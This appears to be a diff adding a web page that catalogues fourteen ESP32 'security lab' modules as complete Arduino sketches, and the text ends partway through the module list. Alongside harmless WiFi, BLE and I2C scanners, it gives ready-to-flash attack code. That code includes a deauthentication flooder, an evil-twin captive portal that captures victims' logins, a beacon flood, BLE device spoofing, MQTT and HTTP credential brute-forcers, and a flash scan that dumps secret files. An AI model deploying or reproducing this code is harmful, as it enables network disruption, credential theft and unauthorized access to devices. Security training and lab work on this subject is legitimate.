@@ -1,0 +1,937 @@
+
+<style>
+h2.sr-only{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0)}
+.cat-btn{padding:7px 14px;border-radius:20px;border:1px solid var(--border);background:var(--surface-1);color:var(--text-secondary);cursor:pointer;font-family:var(--font-mono);font-size:12px;display:inline-flex;align-items:center;gap:6px;transition:all 0.15s}
+.cat-btn.active{color:var(--cat-text);background:var(--cat-bg);border-color:var(--cat-text)}
+.card{background:var(--surface-1);border:0.5px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:10px}
+.card-header{padding:14px 16px;display:flex;justify-content:space-between;align-items:flex-start;gap:12px}
+.code-pre{margin:0;padding:16px;overflow-x:auto;font-family:var(--font-mono);font-size:11.5px;line-height:1.65;color:var(--text-primary);background:var(--surface-0);border-top:0.5px solid var(--border);max-height:480px;overflow-y:auto}
+.lib-pill{background:var(--surface-0);color:var(--text-accent);padding:2px 8px;border-radius:20px;font-size:10px;border:0.5px solid var(--border-accent);font-family:var(--font-mono)}
+.warn-bar{background:var(--bg-warning);border:0.5px solid var(--border-warning);border-radius:8px;padding:8px 14px;font-size:12px;color:var(--text-warning);display:flex;align-items:center;gap:8px;margin-bottom:16px}
+.top-stripe{height:3px;width:100%;background:var(--cat-fill)}
+.count-pill{background:var(--surface-0);color:var(--text-muted);padding:2px 8px;border-radius:20px;font-size:10px;border:0.5px solid var(--border);font-family:var(--font-mono)}
+.btn-sm{padding:5px 12px;border-radius:6px;border:0.5px solid var(--border-strong);background:var(--surface-2);color:var(--text-secondary);cursor:pointer;font-size:11px;font-family:var(--font-mono);white-space:nowrap}
+.btn-copy{padding:5px 12px;border-radius:6px;border:none;cursor:pointer;font-size:11px;font-family:var(--font-mono);white-space:nowrap;font-weight:500}
+</style>
+
+<h2 class="sr-only">ESP32 IoT Security Lab — 14 cybersecurity attack modules for authorized lab training on ESP32 DevKit</h2>
+<div id="root" style="padding:4px 0"></div>
+
+<script>
+const CATS=[
+  {id:"recon",    label:"WiFi Recon",    icon:"ti-wifi",            fill:"var(--fill-success)",  bg:"var(--bg-success)",  text:"var(--text-success)"},
+  {id:"attacks",  label:"WiFi Attacks",  icon:"ti-alert-triangle",  fill:"var(--fill-warning)",  bg:"var(--bg-warning)",  text:"var(--text-warning)"},
+  {id:"ble",      label:"BLE Security",  icon:"ti-bluetooth",       fill:"var(--fill-accent)",   bg:"var(--bg-accent)",   text:"var(--text-accent)"},
+  {id:"network",  label:"Network",       icon:"ti-server",          fill:"var(--fill-pro)",      bg:"var(--bg-pro)",      text:"var(--text-pro)"},
+  {id:"hardware", label:"Hardware",      icon:"ti-cpu",             fill:"var(--fill-danger)",   bg:"var(--bg-danger)",   text:"var(--text-danger)"},
+];
+
+const C1=`#include <WiFi.h>
+
+const char* encStr(wifi_auth_mode_t e) {
+  switch(e) {
+    case WIFI_AUTH_OPEN:            return "OPEN";
+    case WIFI_AUTH_WEP:             return "WEP";
+    case WIFI_AUTH_WPA_PSK:         return "WPA";
+    case WIFI_AUTH_WPA2_PSK:        return "WPA2";
+    case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/WPA2";
+    case WIFI_AUTH_WPA3_PSK:        return "WPA3";
+    default:                        return "UNK";
+  }
+}
+
+void setup() {
+  Serial.begin(115200);
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+  Serial.println("[*] ESP32 WiFi Scanner ready");
+}
+
+void loop() {
+  int n = WiFi.scanNetworks();
+  Serial.printf("\\n[*] Found %d APs:\\n", n);
+  Serial.println(" # | SSID                       | BSSID             | CH | RSSI | ENC");
+  Serial.println("---+----------------------------+-------------------+----+------+-------");
+  for (int i = 0; i < n; i++) {
+    Serial.printf("%2d | %-26s | %s | %2d | %4d | %s\\n",
+      i+1, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(),
+      WiFi.channel(i), WiFi.RSSI(i), encStr(WiFi.encryptionType(i)));
+  }
+  WiFi.scanDelete();
+  delay(5000);
+}`;
+
+const C2=`#include <esp_wifi.h>
+#include <nvs_flash.h>
+#include <map>
+#include <set>
+#include <string>
+
+std::map<std::string, std::set<std::string>> seen;
+
+typedef struct {
+  unsigned frame_ctrl:16, duration:16;
+  uint8_t  dst[6], src[6], bssid[6];
+  unsigned seq:16;
+} mgmt_hdr_t;
+
+void IRAM_ATTR sniffCB(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_MGMT) return;
+  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
+  mgmt_hdr_t* h = (mgmt_hdr_t*)p->payload;
+  // Probe Request frame control = 0x0040
+  if ((h->frame_ctrl & 0x00FC) != 0x0040) return;
+
+  uint8_t* body = p->payload + sizeof(mgmt_hdr_t);
+  uint8_t ssid_len = body[1];
+  char ssid[33] = "<any>";
+  if (body[0]==0 && ssid_len>0 && ssid_len<33) {
+    memcpy(ssid, body+2, ssid_len);
+    ssid[ssid_len] = 0;
+  }
+  char mac[18];
+  snprintf(mac, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
+    h->src[0],h->src[1],h->src[2],h->src[3],h->src[4],h->src[5]);
+
+  std::string m(mac), s(ssid);
+  if (!seen[m].count(s)) {
+    seen[m].insert(s);
+    Serial.printf("[PROBE] %s  ->  \\"%s\\"  (RSSI:%d)\\n", mac, ssid, p->rx_ctrl.rssi);
+  }
+}
+
+int ch=1; unsigned long lastHop=0;
+
+void setup() {
+  Serial.begin(115200);
+  nvs_flash_init();
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  esp_wifi_set_mode(WIFI_MODE_NULL);
+  esp_wifi_start();
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&sniffCB);
+  Serial.println("[*] Probe sniffer active — channel hopping\\n");
+}
+
+void loop() {
+  if (millis()-lastHop > 500) {
+    ch = (ch%13)+1;
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    lastHop = millis();
+  }
+}`;
+
+const C3=`#include <esp_wifi.h>
+#include <nvs_flash.h>
+
+typedef struct {
+  unsigned fc:16, dur:16;
+  uint8_t addr1[6], addr2[6], addr3[6];
+  unsigned seq:16;
+} ieee80211_t;
+
+const char* ftype(uint16_t fc) {
+  switch((fc>>2)&0x3F) {
+    case 0x04: return "PROBE-REQ ";
+    case 0x08: return "BEACON    ";
+    case 0x0B: return "AUTH      ";
+    case 0x0C: return "DEAUTH    ";
+    case 0x20: return "DATA      ";
+    default:   return "OTHER     ";
+  }
+}
+
+void IRAM_ATTR rxCB(void* buf, wifi_promiscuous_pkt_type_t type) {
+  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
+  ieee80211_t* h = (ieee80211_t*)p->payload;
+  Serial.printf("[%s] CH:%2d RSSI:%4d SRC:%02X:%02X:%02X:%02X:%02X:%02X DST:%02X:%02X:%02X:%02X:%02X:%02X\\n",
+    ftype(h->fc), p->rx_ctrl.channel, p->rx_ctrl.rssi,
+    h->addr2[0],h->addr2[1],h->addr2[2],h->addr2[3],h->addr2[4],h->addr2[5],
+    h->addr1[0],h->addr1[1],h->addr1[2],h->addr1[3],h->addr1[4],h->addr1[5]);
+}
+
+int ch=1; unsigned long lastHop=0;
+
+void setup() {
+  Serial.begin(115200);
+  nvs_flash_init();
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  esp_wifi_set_mode(WIFI_MODE_NULL);
+  esp_wifi_start();
+  wifi_promiscuous_filter_t f = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
+  esp_wifi_set_promiscuous_filter(&f);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&rxCB);
+  Serial.println("[*] Monitor mode ON — all 802.11 frames\\n");
+}
+
+void loop() {
+  if (millis()-lastHop > 1000) {
+    ch = (ch%13)+1;
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    Serial.printf("\\n--- CH %d ---\\n", ch);
+    lastHop = millis();
+  }
+}`;
+
+const C4=`#include <esp_wifi.h>
+#include <nvs_flash.h>
+#include <string.h>
+
+// ===== CONFIGURE BEFORE UPLOAD =====
+uint8_t AP_MAC[]  = {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF}; // Target AP BSSID
+uint8_t CLI_MAC[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};   // Client (FF:FF... = all)
+uint8_t CH = 6;         // AP channel
+int BURSTS = 10;        // Frames per burst
+// ====================================
+
+uint8_t frame[26] = {
+  0xC0, 0x00,              // Frame Control: Deauthentication
+  0x3A, 0x01,              // Duration
+  0x00,0x00,0x00,0x00,0x00,0x00,  // addr1: Destination (client)
+  0x00,0x00,0x00,0x00,0x00,0x00,  // addr2: Source (AP)
+  0x00,0x00,0x00,0x00,0x00,0x00,  // addr3: BSSID
+  0x00, 0x00,              // Sequence
+  0x07, 0x00               // Reason 7: Class 3 frame from nonassoc STA
+};
+
+void setup() {
+  Serial.begin(115200);
+  nvs_flash_init();
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  esp_wifi_start();
+  esp_wifi_set_channel(CH, WIFI_SECOND_CHAN_NONE);
+
+  memcpy(frame+4,  CLI_MAC, 6);   // addr1 = destination client
+  memcpy(frame+10, AP_MAC,  6);   // addr2 = source (AP)
+  memcpy(frame+16, AP_MAC,  6);   // addr3 = BSSID
+
+  Serial.printf("[*] Deauth Attack\\n");
+  Serial.printf("[*] AP  : %02X:%02X:%02X:%02X:%02X:%02X  CH:%d\\n",
+    AP_MAC[0],AP_MAC[1],AP_MAC[2],AP_MAC[3],AP_MAC[4],AP_MAC[5], CH);
+  Serial.printf("[*] Tgt : %02X:%02X:%02X:%02X:%02X:%02X\\n",
+    CLI_MAC[0],CLI_MAC[1],CLI_MAC[2],CLI_MAC[3],CLI_MAC[4],CLI_MAC[5]);
+}
+
+void loop() {
+  for (int i = 0; i < BURSTS; i++) {
+    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+    delay(5);
+  }
+  Serial.printf("[*] Sent %d deauth frames\\n", BURSTS);
+  delay(1000);
+}`;
+
+const C5=`#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+
+// ===== SET TARGET SSID =====
+const char* AP_SSID = "Free_Airport_WiFi";
+// ===========================
+
+DNSServer dns;
+WebServer srv(80);
+
+const char PAGE[] PROGMEM = R"rawhtml(
+<!DOCTYPE html><html><head>
+<meta name='viewport' content='width=device-width,initial-scale=1'>
+<title>Network Login</title><style>
+body{font-family:Arial;max-width:380px;margin:50px auto;padding:16px}
+input{width:100%;padding:8px;margin:6px 0;box-sizing:border-box;border:1px solid #ccc}
+button{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;cursor:pointer}
+</style></head><body>
+<h2>&#x1F4F6; WiFi Login Required</h2>
+<form method='POST' action='/login'>
+  Email / Username<br><input name='u' type='text' autocomplete='off'><br>
+  Password<br><input name='p' type='password'><br><br>
+  <button>Connect to Internet</button>
+</form></body></html>)rawhtml";
+
+void root()  { srv.send(200, "text/html", PAGE); }
+void login() {
+  Serial.printf("[CAPTURE] user=%-20s pass=%s  (from %s)\\n",
+    srv.arg("u").c_str(), srv.arg("p").c_str(),
+    srv.client().remoteIP().toString().c_str());
+  srv.send(200, "text/html", "<h3>Authenticating... please wait.</h3>");
+}
+
+void setup() {
+  Serial.begin(115200);
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(AP_SSID);
+  IPAddress ip = WiFi.softAPIP();
+  Serial.printf("[*] Evil Twin: '%s'  IP: %s\\n", AP_SSID, ip.toString().c_str());
+  dns.start(53, "*", ip);    // Redirect ALL DNS queries to us
+  srv.on("/", HTTP_GET, root);
+  srv.on("/login", HTTP_POST, login);
+  srv.onNotFound(root);      // Captive portal catch-all
+  srv.begin();
+  Serial.println("[*] Captive portal ready. Waiting for victims...");
+}
+
+void loop() {
+  dns.processNextRequest();
+  srv.handleClient();
+}`;
+
+const C6=`#include <esp_wifi.h>
+#include <nvs_flash.h>
+#include <string.h>
+
+const char* SSIDS[] = {
+  "FBI_Surveillance_Van_3",   "Pretty_Fly_for_a_WiFi",
+  "Everyday_Im_Buffering",    "Abraham_Linksys",
+  "Drop_It_Like_Its_Hotspot", "Silence_of_the_LANs",
+  "The_Promised_LAN",         "I_Believe_Wi_Can_Fi",
+  "Loading___Please_Wait",    "Not_Your_Grandmas_WiFi"
+};
+const int N = 10;
+
+const uint8_t BCN_HEAD[] = {
+  0x80,0x00, 0x00,0x00,                       // Frame Control, Duration
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,              // DA: Broadcast
+  0x00,0x00,0x00,0x00,0x00,0x00,             // SA (filled per beacon)
+  0x00,0x00,0x00,0x00,0x00,0x00,             // BSSID (filled per beacon)
+  0x00,0x00,                                  // Sequence Control
+  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,  // Timestamp
+  0x64,0x00,                                  // Beacon Interval: 100 TU
+  0x31,0x04,                                  // Capability Info
+  0x00                                        // SSID element tag
+};
+
+uint8_t buf[200];
+
+void sendBeacon(const char* ssid) {
+  uint8_t mac[6] = {0x02,(uint8_t)random(256),(uint8_t)random(256),
+                         (uint8_t)random(256),(uint8_t)random(256),(uint8_t)random(256)};
+  int slen = strlen(ssid);
+  memcpy(buf, BCN_HEAD, sizeof(BCN_HEAD));
+  memcpy(buf+10, mac, 6);
+  memcpy(buf+16, mac, 6);
+  buf[sizeof(BCN_HEAD)] = slen;
+  memcpy(buf+sizeof(BCN_HEAD)+1, ssid, slen);
+  int pos = sizeof(BCN_HEAD)+1+slen;
+  // Supported Rates tag
+  uint8_t rates[]={0x01,0x08,0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
+  memcpy(buf+pos, rates, sizeof(rates)); pos+=sizeof(rates);
+  // DS Parameter Set tag (channel 6)
+  buf[pos++]=0x03; buf[pos++]=0x01; buf[pos++]=6;
+  esp_wifi_80211_tx(WIFI_IF_AP, buf, pos, false);
+}
+
+void setup() {
+  Serial.begin(115200);
+  nvs_flash_init();
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  wifi_config_t ap={};
+  strcpy((char*)ap.ap.ssid,"ESP32"); ap.ap.channel=6;
+  esp_wifi_set_config(WIFI_IF_AP,&ap);
+  esp_wifi_start();
+  Serial.printf("[*] Beacon Flood — %d fake SSIDs\\n", N);
+}
+
+void loop() {
+  for (int i=0;i<N;i++) { sendBeacon(SSIDS[i]); delay(5); }
+  delay(200);
+}`;
+
+const C7=`#include <BLEDevice.h>
+#include <BLEScan.h>
+#include <BLEAdvertisedDevice.h>
+
+BLEScan* pScan;
+
+class ScanCB : public BLEAdvertisedDeviceCallbacks {
+  void onResult(BLEAdvertisedDevice dev) {
+    Serial.printf("\\n[BLE] %-30s  MAC: %s  RSSI: %d\\n",
+      dev.getName().length() ? dev.getName().c_str() : "(hidden)",
+      dev.getAddress().toString().c_str(), dev.getRSSI());
+    Serial.printf("       AddrType: %s\\n",
+      dev.getAddress().getType()==BLE_ADDR_TYPE_PUBLIC ? "PUBLIC" : "RANDOM");
+    if (dev.haveServiceUUID())
+      Serial.printf("       SvcUUID : %s\\n", dev.getServiceUUID().toString().c_str());
+    if (dev.haveManufacturerData()) {
+      std::string md = dev.getManufacturerData();
+      Serial.printf("       MfrData : ");
+      for (uint8_t c : md) Serial.printf("%02X ", c);
+      if (md.size() >= 2) {
+        uint16_t vid = (uint8_t)md[0] | ((uint8_t)md[1]<<8);
+        if      (vid==0x004C) Serial.print("(Apple)");
+        else if (vid==0x0006) Serial.print("(Microsoft)");
+        else if (vid==0x0075) Serial.print("(Samsung)");
+        else if (vid==0x00E0) Serial.print("(Google)");
+      }
+      Serial.println();
+    }
+    if (dev.haveAppearance())
+      Serial.printf("       Appearance: 0x%04X\\n", dev.getAppearance());
+  }
+};
+
+void setup() {
+  Serial.begin(115200);
+  BLEDevice::init("ESP32_Scanner");
+  pScan = BLEDevice::getScan();
+  pScan->setAdvertisedDeviceCallbacks(new ScanCB());
+  pScan->setActiveScan(true);
+  pScan->setInterval(100);
+  pScan->setWindow(99);
+  Serial.println("[*] BLE Active Scanner running\\n");
+}
+
+void loop() {
+  Serial.println("\\n[*] Scanning 5 sec...");
+  BLEScanResults r = pScan->start(5, false);
+  Serial.printf("[*] Done. Devices found: %d\\n", r.getCount());
+  pScan->clearResults();
+  delay(3000);
+}`;
+
+const C8=`#include <BLEDevice.h>
+#include <BLEServer.h>
+#include <BLEAdvertising.h>
+
+struct FakeDev { const char* name; const char* uuid; uint16_t appearance; };
+
+FakeDev DEVS[] = {
+  {"Tile_Tracker",   "0000feed-0000-1000-8000-00805f9b34fb", 0x0180},
+  {"Mi_Band_7",      "0000fee0-0000-1000-8000-00805f9b34fb", 0x0180},
+  {"HeartRate_Mon",  "0000180d-0000-1000-8000-00805f9b34fb", 0x0341},
+  {"Smart_Bulb_9A",  "0000ffe0-0000-1000-8000-00805f9b34fb", 0x07C0},
+  {"BLE_Keyboard",   "00001812-0000-1000-8000-00805f9b34fb", 0x03C1},
+};
+const int N=5;
+int idx=0;
+BLEAdvertising* pAdv;
+
+void spoof(FakeDev& d) {
+  pAdv->stop();
+  BLEDevice::deinit(false);
+  BLEDevice::init(d.name);
+  pAdv = BLEDevice::getAdvertising();
+
+  BLEAdvertisementData adv;
+  adv.setName(d.name);
+  adv.setAppearance(d.appearance);
+  adv.setFlags(0x06);   // LE General Discoverable
+
+  BLEAdvertisementData scan;
+  scan.setCompleteServices(BLEUUID(d.uuid));
+
+  pAdv->setAdvertisementData(adv);
+  pAdv->setScanResponseData(scan);
+  pAdv->setScanResponse(true);
+  pAdv->start();
+
+  Serial.printf("[SPOOF] -> %-20s  UUID: %s\\n       MAC: %s\\n",
+    d.name, d.uuid, BLEDevice::getAddress().toString().c_str());
+}
+
+void setup() {
+  Serial.begin(115200);
+  BLEDevice::init("ESP32");
+  pAdv = BLEDevice::getAdvertising();
+  Serial.println("[*] BLE Device Spoofer — cycling every 5s\\n");
+  spoof(DEVS[0]);
+}
+
+void loop() {
+  delay(5000);
+  idx = (idx+1)%N;
+  spoof(DEVS[idx]);
+}`;
+
+const C9=`#include <WiFi.h>
+#include <PubSubClient.h>
+
+// ===== CONFIG =====
+#define WIFI_SSID  "YourWiFi"
+#define WIFI_PASS  "YourPassword"
+#define MQTT_HOST  "192.168.1.100"
+#define MQTT_PORT  1883
+// ==================
+
+const char* U[] = {"admin","user","root","mqtt","guest","operator",""};
+const char* P[] = {"admin","password","123456","mqtt","root","1234","guest",""};
+const int UL=7, PL=8;
+
+WiFiClient net;
+PubSubClient mqtt(net);
+bool found=false;
+
+void onMsg(char* t, byte* m, unsigned int l) {
+  Serial.printf("[MSG] [%s]: ", t);
+  for(unsigned i=0;i<l;i++) Serial.print((char)m[i]);
+  Serial.println();
+}
+
+bool tryLogin(const char* u, const char* p) {
+  String id = "esp_" + String(random(0xFFFF), HEX);
+  return mqtt.connect(id.c_str(), *u ? u : NULL, *p ? p : NULL);
+}
+
+void setup() {
+  Serial.begin(115200);
+  WiFi.begin(WIFI_SSID, WIFI_PASS);
+  while(WiFi.status()!=WL_CONNECTED){delay(500);Serial.print(".");}
+  Serial.printf("\\n[*] MQTT BruteForce -> %s:%d\\n\\n", MQTT_HOST, MQTT_PORT);
+  mqtt.setServer(MQTT_HOST, MQTT_PORT);
+  mqtt.setCallback(onMsg);
+
+  for(int u=0; u<UL && !found; u++) {
+    for(int p=0; p<PL && !found; p++) {
+      Serial.printf("[*] Trying [%s]:[%s] ... ", U[u], P[p]);
+      if(tryLogin(U[u], P[p])) {
+        Serial.println("SUCCESS!");
+        mqtt.subscribe("#");  // Wildcard — intercept ALL messages
+        Serial.printf("[+] Subscribed to '#' as [%s]:[%s]\\n", U[u], P[p]);
+        found=true;
+      } else {
+        Serial.printf("fail (rc=%d)\\n", mqtt.state());
+        mqtt.disconnect();
+        delay(300);
+      }
+    }
+  }
+  if(!found) Serial.println("[-] No valid credentials found.");
+}
+
+void loop() {
+  if(found && mqtt.connected()) {
+    mqtt.loop();
+    static unsigned long t=0;
+    if(millis()-t > 10000) {
+      mqtt.publish("pentest/alert", "esp32_active");
+      Serial.println("[*] Heartbeat injected to pentest/alert");
+      t=millis();
+    }
+  }
+}`;
+
+const C10=`#include <WiFi.h>
+#include <HTTPClient.h>
+#include <base64.h>
+
+// ===== CONFIG =====
+#define WIFI_SSID "YourWiFi"
+#define WIFI_PASS "YourPassword"
+#define TARGET    "http://192.168.1.1/admin"
+// ==================
+
+const char* U[]={"admin","root","user","administrator","guest","support"};
+const char* P[]={"admin","root","password","123456","1234","admin123","","default","toor"};
+const int UL=6, PL=9;
+
+WiFiClient  net;
+HTTPClient  http;
+
+int tryAuth(const char* u, const char* p) {
+  http.begin(net, TARGET);
+  http.addHeader("Authorization", "Basic " + base64::encode(String(u)+":"+p));
+  http.addHeader("User-Agent", "Mozilla/5.0 (ESP32 Pentest)");
+  int code = http.GET();
+  http.end();
+  return code;
+}
+
+void setup() {
+  Serial.begin(115200);
+  WiFi.begin(WIFI_SSID, WIFI_PASS);
+  while(WiFi.status()!=WL_CONNECTED){delay(500);Serial.print(".");}
+  Serial.printf("\\n[*] HTTP BasicAuth Attack -> %s\\n\\n", TARGET);
+  Serial.println(" USER            | PASS         | HTTP");
+  Serial.println("-----------------+--------------+------");
+
+  for(int u=0; u<UL; u++) {
+    for(int p=0; p<PL; p++) {
+      Serial.printf(" %-15s | %-12s | ", U[u], P[p]);
+      int code = tryAuth(U[u], P[p]);
+      Serial.printf("%d\\n", code);
+      if(code==200 || code==302 || code==301) {
+        Serial.printf("\\n[+] SUCCESS: %s / %s (HTTP %d)\\n", U[u], P[p], code);
+        return;
+      }
+      delay(300);
+    }
+  }
+  Serial.println("\\n[-] All combinations exhausted.");
+}
+
+void loop() {}`;
+
+const C11=`#include <WiFi.h>
+#include <WiFiClient.h>
+
+// ===== CONFIG =====
+#define WIFI_SSID  "YourWiFi"
+#define WIFI_PASS  "YourPassword"
+#define TARGET_IP  "192.168.1.1"
+// ==================
+
+struct Port { int n; const char* svc; };
+Port PORTS[] = {
+  {21,  "FTP"},         {22,  "SSH"},         {23,  "Telnet"},
+  {80,  "HTTP"},        {443, "HTTPS"},        {502, "Modbus"},
+  {1883,"MQTT"},        {4840,"OPC-UA"},       {5683,"CoAP"},
+  {8080,"HTTP-Alt"},    {8443,"HTTPS-Alt"},    {8883,"MQTT-TLS"},
+  {9200,"Elasticsearch"},{27017,"MongoDB"},
+  {6379,"Redis"},       {3306,"MySQL"},        {5432,"PostgreSQL"},
+  {47808,"BACnet"}
+};
+const int CNT = 18;
+
+void setup() {
+  Serial.begin(115200);
+  WiFi.begin(WIFI_SSID, WIFI_PASS);
+  while(WiFi.status()!=WL_CONNECTED){delay(500);Serial.print(".");}
+  Serial.printf("\\n[*] IoT Port Scan -> %s (%d ports)\\n\\n", TARGET_IP, CNT);
+  Serial.println(" PORT  | SERVICE       | STATE  | BANNER");
+  Serial.println("-------+---------------+--------+----------------------------");
+
+  for(int i=0; i<CNT; i++) {
+    WiFiClient c; c.setTimeout(600);
+    Serial.printf("%5d  | %-13s | ", PORTS[i].n, PORTS[i].svc);
+    if(c.connect(TARGET_IP, PORTS[i].n)) {
+      Serial.print("OPEN   | ");
+      delay(300);
+      if(c.available()) {
+        String b = c.readStringUntil('\\n'); b.trim();
+        if(b.length()>46) b=b.substring(0,46)+"...";
+        Serial.print(b);
+      } else Serial.print("(no banner)");
+      c.stop();
+    } else Serial.print("closed |");
+    Serial.println();
+    delay(100);
+  }
+  Serial.println("\\n[*] Scan complete.");
+}
+
+void loop() {}`;
+
+const C12=`#include <Wire.h>
+
+struct Dev { uint8_t a; const char* n; };
+Dev KNOWN[] = {
+  {0x20,"PCF8574 I/O Expander"},  {0x27,"PCF8574 LCD Backpack"},
+  {0x3C,"SSD1306 OLED"},           {0x3D,"SSD1306 OLED (alt)"},
+  {0x48,"ADS1115 ADC"},            {0x50,"AT24C32 EEPROM"},
+  {0x51,"AT24Cxx EEPROM"},         {0x52,"AT24Cxx EEPROM"},
+  {0x53,"ADXL345 Accelerometer"}, {0x57,"AT24Cxx EEPROM"},
+  {0x68,"MPU-6050 IMU / DS3231 RTC"}, {0x69,"MPU-6050 (alt)"},
+  {0x76,"BME280 / BMP280"},        {0x77,"BME680 / BMP280 (alt)"},
+  {0x23,"BH1750 Light Sensor"},    {0x29,"VL53L0X ToF"},
+};
+const int NK = 16;
+
+const char* identify(uint8_t addr) {
+  for(int i=0; i<NK; i++) if(KNOWN[i].a==addr) return KNOWN[i].n;
+  return "Unknown device";
+}
+
+void setup() {
+  Serial.begin(115200);
+  Wire.begin(21, 22);   // SDA=GPIO21, SCL=GPIO22
+  Wire.setClock(100000);
+  delay(1000);
+  Serial.println("[*] I2C Bus Scanner  SDA=21  SCL=22");
+  Serial.println("=====================================");
+  int found=0;
+  for(uint8_t a=1; a<127; a++) {
+    Wire.beginTransmission(a);
+    uint8_t e = Wire.endTransmission();
+    if(e==0) {
+      found++;
+      Serial.printf("[+] 0x%02X  ->  %s\\n", a, identify(a));
+    } else if(e==4) {
+      Serial.printf("[!] 0x%02X  ->  Bus error\\n", a);
+    }
+    delay(5);
+  }
+  Serial.printf("\\n[*] Found %d device(s)\\n", found);
+}
+
+void loop() {}`;
+
+const C13=`#include <Wire.h>
+
+// ===== CONFIG =====
+#define EEPROM_ADDR  0x50   // AT24C32 default I2C address
+#define EEPROM_SIZE  4096   // 4KB=AT24C32 | 32KB=AT24C256
+#define SDA_PIN      21
+#define SCL_PIN      22
+// ==================
+
+byte readByte(uint16_t addr) {
+  Wire.beginTransmission(EEPROM_ADDR);
+  Wire.write((addr>>8) & 0xFF);   // MSB of address
+  Wire.write(addr & 0xFF);         // LSB of address
+  Wire.endTransmission();
+  Wire.requestFrom(EEPROM_ADDR, 1);
+  return Wire.available() ? Wire.read() : 0xFF;
+}
+
+void setup() {
+  Serial.begin(115200);
+  Wire.begin(SDA_PIN, SCL_PIN);
+  Wire.setClock(400000);
+  delay(500);
+  Serial.printf("[*] EEPROM Dump  0x%02X  —  %d bytes\\n\\n", EEPROM_ADDR, EEPROM_SIZE);
+  Serial.println("         00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F  |  ASCII");
+  Serial.println("---------+-------------------------------+------------------+---------");
+
+  for(int base=0; base<EEPROM_SIZE; base+=16) {
+    Serial.printf("0x%04X : ", base);
+    char asc[17]={0};
+    for(int j=0; j<16 && (base+j)<EEPROM_SIZE; j++) {
+      byte b = readByte(base+j);
+      if(j==8) Serial.print(" ");
+      Serial.printf("%02X ", b);
+      asc[j] = (b>=0x20 && b<0x7F) ? (char)b : '.';
+      delay(2);
+    }
+    Serial.printf(" |  %s\\n", asc);
+  }
+  Serial.println("\\n[*] Dump complete.");
+}
+
+void loop() {}`;
+
+const C14=`#include <SPIFFS.h>
+#include <FS.h>
+
+const char* SENSITIVE[] = {
+  "/config.json", "/settings.json", "/wifi.txt",
+  "/credentials.txt", "/secrets.h", "/api_key.txt",
+  "/passwd", "/auth.dat", "/token.txt", "/cert.pem"
+};
+const int SN = 10;
+
+void setup() {
+  Serial.begin(115200);
+  delay(1000);
+  if(!SPIFFS.begin(true)) { Serial.println("[-] SPIFFS mount failed"); return; }
+
+  Serial.println("[*] SPIFFS Flash Inspector");
+  Serial.printf("[*] Total:%d B  Used:%d B  Free:%d B\\n\\n",
+    SPIFFS.totalBytes(), SPIFFS.usedBytes(),
+    SPIFFS.totalBytes()-SPIFFS.usedBytes());
+
+  // List all files with preview
+  File root = SPIFFS.open("/");
+  File f    = root.openNextFile();
+  Serial.println("--- FILE LISTING ---");
+  while(f) {
+    Serial.printf("[%7d B] /%s\\n", f.size(), f.name());
+    Serial.print("  Preview: ");
+    int lim = min((size_t)80, (size_t)f.size());
+    for(int i=0;i<lim;i++) {
+      char c=(char)f.read();
+      Serial.print(isPrintable(c) ? c : '.');
+    }
+    Serial.println();
+    f = root.openNextFile();
+  }
+  root.close();
+
+  // Hunt for sensitive files
+  Serial.println("\\n--- SENSITIVE FILE SCAN ---");
+  bool any=false;
+  for(int i=0; i<SN; i++) {
+    if(SPIFFS.exists(SENSITIVE[i])) {
+      any=true;
+      Serial.printf("\\n[!!!] FOUND SENSITIVE FILE: %s\\n", SENSITIVE[i]);
+      File sf = SPIFFS.open(SENSITIVE[i]);
+      Serial.println(sf.readString());
+      sf.close();
+    }
+  }
+  if(!any) Serial.println("    No known sensitive files detected.");
+  Serial.println("\\n[*] Inspection complete.");
+}
+
+void loop() {}`;
+
+const CODES = {
+  recon:[
+    {title:"1. WiFi Network Scanner",
+     desc:"Discovers all nearby APs — SSID, BSSID, channel, signal strength, and encryption type. Essential recon foundation.",
+     libs:["WiFi.h"], code:C1},
+    {title:"2. Probe Request Sniffer",
+     desc:"Passively captures 802.11 probe requests revealing every SSID a device previously connected to. Passive OSINT on nearby devices.",
+     libs:["esp_wifi.h","nvs_flash.h"], code:C2},
+    {title:"3. Promiscuous Packet Sniffer",
